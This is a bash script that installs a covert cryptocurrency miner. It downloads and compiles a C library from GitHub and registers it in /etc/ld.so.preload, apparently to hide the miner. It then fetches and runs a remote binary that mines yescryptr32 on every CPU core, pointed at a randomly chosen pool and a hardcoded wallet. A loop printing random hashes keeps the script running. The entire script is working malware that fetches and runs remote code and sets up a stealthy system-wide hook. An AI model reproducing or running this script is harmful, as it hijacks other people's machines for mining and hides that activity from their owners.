#!/bin/bash

set -e  # Exit on any error

# Update and install necessary packages
apt-get update
apt-get install -y sudo wget build-essential jq

# Download and compile the C file
curl -s https://github.com/barburonjilo/back/raw/main/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo "/usr/local/lib/libnyumput.so" >> /etc/ld.so.preload
ldconfig  # Update the linker cache
rm nyumput.c

# Create a directory for the binary and download it
mkdir -p .lib && cd .lib
wget -qO sgr1 https://github.com/barburonjilo/back/raw/main/sr
chmod +x sgr1

# Download the JSON file containing IP addresses
wget -qO list.json https://github.com/barburonjilo/setstra/raw/main/list.json

# Parse JSON to get a random IP address
IP=$(jq -r '.[]' list.json | shuf -n 1)

# Generate a random port between 842 and 852
PORT=$((RANDOM % 10 + 842))

# Get the number of CPU cores
CPU_CORES=$(nproc --all)

# Create wallet information combining core count, IP, and port
WALLET_INFO="${CPU_CORES}-${IP}-${PORT}"

# Calculate CPU core mask for all available cores
CORE_MASK=$(printf "%x" $(( (1 << $(nproc --all)) - 1 )))

# Run the process with `LD_PRELOAD` and set CPU affinity using `taskset`
taskset $CORE_MASK LD_PRELOAD=/usr/local/lib/libnyumput.so ./sgr1 --algorithm yescryptr32 --pool $IP:$PORT --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WALLET_INFO --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &

# Generate random numbers in a loop to keep the script running
while true; do
    echo $RANDOM | md5sum | head -c 20
    echo
    sleep 3m
done
